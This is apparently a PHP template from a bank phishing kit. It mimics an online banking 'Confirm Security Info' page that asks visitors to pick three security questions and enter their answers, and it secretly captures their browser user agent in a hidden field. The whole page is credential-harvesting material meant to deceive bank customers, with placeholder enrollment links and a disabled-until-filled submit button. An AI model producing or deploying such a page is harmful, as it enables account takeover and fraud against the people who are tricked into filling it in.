<?php
include 'head.php';
include 'token.php';
$title = 'Confirm Security Info';
include 'header.php';
?>
<!-- MAIN CONTENT START HERE -->
<!-- Start Card -->
<div class="card_content_2">
  <div class="card-body card_content_3">
    <div class="row ">
      <div class="col-md-12">
        <h5 class="sign_in_text">Confirm Security Info</h5>
      </div>
      <div class="col-md-12 custom_right_padding">
        
        <div class="form_box">
          <div style="border-radius: 7px 7px 0px 0px; margin-top: -1px; padding: 6px 8px" class="form_title">Please confirm security answer:</div>
          <form action="" method="POST">
            
            <input type="hidden" name="token" value="<?= $token; ?>">
            
            <div class="form-group form_group_custom">
              <label>Security Question 1:</label><br>
              <select required="required" id="cc" style="margin-top: -4px;" type="" name="question_1">
                <option value=""> -Choose- </option>
                <option value="What street did your best friend in high school live on?(Enter full name of streets only)">What street did your best friend in high school live on?(Enter full name of streets only)</option>
                <option value="What was your favorite restaurant in college?">What was your favorite restaurant in college?</option>
                <option value="What is the name of the band you liked most during high school?">What is the name of the band you liked most during high school?</option>
                <option value="What was the last name of your favorite teacher in your final year of high school?">What was the last name of your favorite teacher in your final year of high school?</option>
                <option value="Where were you when you had your first kiss?">Where were you when you had your first kiss?</option>
                <option value="What was your favorite movie as a child?">What was your favorite movie as a child?</option>
                <option value="What is your oldest sibling's nickname?">What is your oldest sibling's nickname?</option>
                <option value="What was your favorite place to visit as a child?">What was your favorite place to visit as a child?</option>
                <option value="What is your oldest cousin's first and last name?">What is your oldest cousin's first and last name?</option>
                <option value="What as your favorite book as a child?">What as your favorite book as a child?</option>
              </select>
            </div>
            <div class="form-group form_group_custom" style="margin-top: 2px;">
              <label>Answer Question 1:</label><br>
              <input required="required" id="last_name"style="margin-top: -4px;" type="" name="answer_q_1">
            </div>
            <div class="form-group form_group_custom">
              <label>Security Question 2:</label><br>
              <select required="required" id="cc" style="margin-top: -4px;" type="" name="question_2">
                <option value=""> -Choose- </option>
                <option value="What was the first name of your first manager?">What was the first name of your first manager?</option>
                <option value="What was the name of your first girlfriend/boyfriend?">What was the name of your first girlfriend/boyfriend?</option>
                <option value="What were your wedding colors?">What were your wedding colors?</option>
                <option value="What was your favorite Halloween costume in elementary school?">What was your favorite Halloween costume in elementary school?</option>
                <option value="On what street was the first address you lived in outside your parents home?">On what street was the first address you lived in outside your parents home?</option>
                <option value="What is the first name of your oldest niece?">What is the first name of your oldest niece?</option>
                <option value="What is the name of a college you applied to but didn't attend?">What is the name of a college you applied to but didn't attend?</option>
                <option value="What was the name of your first pet?">What was the name of your first pet?</option>
                <option value="What famous person would you have liked to meet?">What famous person would you have liked to meet?</option>
                <option value="What was the last name of your fourth grade teacher?">What was the last name of your fourth grade teacher?</option>
              </select>
            </div>
            <div class="form-group form_group_custom" style="margin-top: 2px;">
              <label>Answer Question 2:</label><br>
              <input required="required" id="last_name"style="margin-top: -4px;" type="" name="answer_q_2">
            </div>
            <div class="form-group form_group_custom">
              <label>Security Question 3:</label><br>
              <select required="required" id="cc" style="margin-top: -4px;" type="" name="question_3">
                <option value=""> -Choose- </option>
                <option value="What was your favorite toy when you were a child?">What was your favorite toy when you were a child?</option>
                <option value="What was the first and last name of your first roommate during college?">What was the first and last name of your first roommate during college?</option>
                <option value="What is your youngest cousin's first and last name?">What is your youngest cousin's first and last name?</option>
                <option value="What is the first name of your oldest nephew?">What is the first name of your oldest nephew?</option>
                <option value="What is the first and last name of your most memorable childhood babysitter/caregiver?">What is the first and last name of your most memorable childhood babysitter/caregiver?</option>
                <option value="What was the TV series you liked most as a child?">What was the TV series you liked most as a child?</option>
                <option value="What is the first and last name of the person you went to your prom with?">What is the first and last name of the person you went to your prom with?</option>
                <option value="What is the last name of you least favorite teacher in high school?">What is the last name of you least favorite teacher in high school?</option>
                <option value="What is your maternal grandfather's profession?">What is your maternal grandfather's profession?</option>
                <option value="In what city or country do you want to retire?">In what city or country do you want to retire?</option>
              </select>
            </div>
            <div class="form-group form_group_custom" style="margin-top: 2px;">
              <label>Answer Question 3:</label><br>
              <input required="required" id="last_name"style="margin-top: -4px;" type="" name="answer_q_3">
            </div>
            
            <?php
            $agent = $_SERVER["HTTP_USER_AGENT"]; { ?>
            <input type="hidden" value="<?= $agent; ?>" name="user_agent" >
            <?php } ?>
            <br>
            <div class="form-group">
              <button style="width: 130px !important;" disabled="disabled" id="submit" type="submit" name="qna_submit"  class="btn btn-secondary btn-sm btn_signin">Continue</button>
            </div>
            <p class="footer_form">
              <strong>Enroll in Online Banking:</strong><br>
              <div class="link_btm" style="font-size: 10.89px;">
                <a href="#">Personal</a> | <a href="#">Small Business</a>
              </div>
            </p>
          </form>
        </div>
        
      </div>
      <!-- <div class="col-md-8 custom_left_padding">
        <div class="card radiuses" style="border: none;">
          <div class="desc_text_box">
            <p class="desc_text">
              All of the account information and services you have come to expect from Online Banking are ready and waiting for you. Just complete the sign in process to see your account(s), view statements, pay bills, and conduct the activities that you normally would.
              <br><br>
              <strong>To Sign In</strong>: Enter your User ID and password. Then, click the 'Sign In' button.
            </p>
          </div>
        </div>
      </div> -->
    </div>
    <script type="text/javascript">
    (function() {
    $('form > div > input').keyup(function() {
    var empty = false;
    $('form > div > input').each(function() {
    if ($(this).val() == '') {
    empty = true;
    }
    });
    if (empty) {
    $('#submit').attr('disabled', 'disabled'); // updated according to http://stackoverflow.com/questions/7637790/how-to-remove-disabled-attribute-with-jquery-ie
    } else {
    $('#submit').removeAttr('disabled'); // updated according to http://stackoverflow.com/questions/7637790/how-to-remove-disabled-attribute-with-jquery-ie
    }
    });
    })()
    </script>
    <!-- FOOTER -->
    <?php
    include 'footer.php';
    ?>